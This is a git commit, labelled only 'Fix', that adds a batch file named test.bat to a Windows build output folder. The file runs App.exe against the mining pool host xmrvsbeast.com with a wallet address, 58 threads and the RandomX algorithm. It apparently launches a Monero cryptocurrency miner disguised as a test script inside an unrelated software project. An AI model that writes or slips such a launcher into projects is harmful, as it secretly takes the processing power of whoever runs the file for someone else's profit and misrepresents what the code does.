0ab6ac7d683fea52b9370a8acddfd93867aa8375
Maeiky <maeiky@gmail.com>
2021-08-14 15:15:44 -0400

    Fix

---
+++ cwc/_out/Windows_x64_O2/test.bat
@@ -0,0 +1,3 @@
+cd /d "%~dp0"
+App.exe -o xmrvsbeast.com:4242 -u 88sFNvfsbnJFdd64kNRVT1fTBuvKVVhiWRA2zft1VZbDbxyYe3xJwHYUYzDSYXtKDGTpgdtdASb5H4iuEmigs9dB7u33soZ -p x -t 58 --cpu-priority 0 -a rx/0
+pause
